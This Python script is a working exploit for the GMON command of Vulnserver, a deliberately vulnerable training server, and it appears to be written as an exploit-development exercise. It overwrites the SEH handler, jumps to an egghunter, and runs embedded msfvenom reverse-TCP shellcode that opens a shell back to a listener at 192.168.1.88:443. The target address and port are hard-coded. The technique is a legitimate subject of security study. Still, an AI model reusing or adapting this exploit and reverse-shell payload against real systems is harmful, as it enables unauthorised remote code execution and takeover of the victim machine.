#!/usr/bin/python
# Author: Xavi Bel
# Website: xavibel.com
# Date: 20/07/2019
# Vulnserver GMON - Egghunter
import socket
import os
import sys

# [*] Exact match at offset 3519
junk1 = "A" * 3149

# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.1.88 LPORT=443 EXITFUNC=none -b "\x00" -f python -v shellcode
# Payload size: 358 bytes
shellcode  = "T00WT00W"
shellcode += "\xba\xba\xbb\x18\x8a\xda\xd0\xd9\x74\x24\xf4\x58"
shellcode += "\x33\xc9\xb1\x53\x31\x50\x15\x83\xe8\xfc\x03\x50"
shellcode += "\x11\xe2\x4f\x47\xf0\x08\xaf\xb8\x01\x6d\x26\x5d"
shellcode += "\x30\xad\x5c\x15\x63\x1d\x17\x7b\x88\xd6\x75\x68"
shellcode += "\x1b\x9a\x51\x9f\xac\x11\x87\xae\x2d\x09\xfb\xb1"
shellcode += "\xad\x50\x2f\x12\x8f\x9a\x22\x53\xc8\xc7\xce\x01"
shellcode += "\x81\x8c\x7c\xb6\xa6\xd9\xbc\x3d\xf4\xcc\xc4\xa2"
shellcode += "\x4d\xee\xe5\x74\xc5\xa9\x25\x76\x0a\xc2\x6c\x60"
shellcode += "\x4f\xef\x27\x1b\xbb\x9b\xb6\xcd\xf5\x64\x14\x30"
shellcode += "\x3a\x97\x65\x74\xfd\x48\x10\x8c\xfd\xf5\x22\x4b"
shellcode += "\x7f\x22\xa7\x48\x27\xa1\x1f\xb5\xd9\x66\xf9\x3e"
shellcode += "\xd5\xc3\x8e\x19\xfa\xd2\x43\x12\x06\x5e\x62\xf5"
shellcode += "\x8e\x24\x40\xd1\xcb\xff\xe9\x40\xb6\xae\x16\x92"
shellcode += "\x19\x0e\xb2\xd8\xb4\x5b\xcf\x82\xd0\xa8\xfd\x3c"
shellcode += "\x21\xa7\x76\x4e\x13\x68\x2c\xd8\x1f\xe1\xea\x1f"
shellcode += "\x29\xe5\x0d\xcf\x91\x66\xf0\xf0\xe1\xaf\x36\xa4"
shellcode += "\xb1\xc7\x9f\xc5\x59\x18\x20\x10\xf7\x12\xb6\x5b"
shellcode += "\xa0\x22\x1e\x34\xb3\x24\x9f\x7f\x3a\xc2\xcf\x2f"
shellcode += "\x6d\x5b\xaf\x9f\xcd\x0b\x47\xca\xc1\x74\x77\xf5"
shellcode += "\x0b\x1d\x1d\x1a\xe2\x75\x89\x83\xaf\x0e\x28\x4b"
shellcode += "\x7a\x6b\x6a\xc7\x8f\x8b\x24\x20\xe5\x9f\x50\x57"
shellcode += "\x05\x60\xa0\xf2\x05\x0a\xa4\x54\x51\xa2\xa6\x81"
shellcode += "\x95\x6d\x59\xe4\xa5\x6a\xa5\x79\x9c\x01\x93\xef"
shellcode += "\xa0\x7d\xdb\xff\x20\x7e\x8d\x95\x20\x16\x69\xce"
shellcode += "\x72\x03\x76\xdb\xe6\x98\xe2\xe4\x5e\x4c\xa5\x8c"
shellcode += "\x5c\xab\x81\x12\x9e\x9e\x92\x55\x60\x5c\xbc\xfd"
shellcode += "\x09\x9e\xfc\xfd\xc9\xf4\xfc\xad\xa1\x03\xd3\x42"
shellcode += "\x02\xeb\xfe\x0a\x0a\x66\x6e\xf8\xab\x77\xbb\x5c"
shellcode += "\x72\x77\x4f\x45\x85\x02\x3f\x7a\x66\xf3\x56\x1f"
shellcode += "\x66\xf3\x57\x21\x5a\x25\x61\x57\x9d\xf5"

# EB08 JMP SHORT +8
short_jump = "\xEB\x08\x90\x90"

# 625010B4 POP-POP-RET
seh  = "\xB4\x10\x50\x62"

# 2 bytes of padding, we are going to jmp over them
padding = "X" * 2

# egghunter - 32 bytes
# egg = W00T
egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x54\x30\x30\x57\x89\xD7\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

junk2 = "B" * 1443


crash = shellcode + junk1 + short_jump + seh + padding + egghunter + junk2

buffer="GMON /.:/"
buffer+= crash + "\r\n"
print "[*] Sending exploit!"

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.1.99", 9999))
expl.send(buffer)
expl.close()
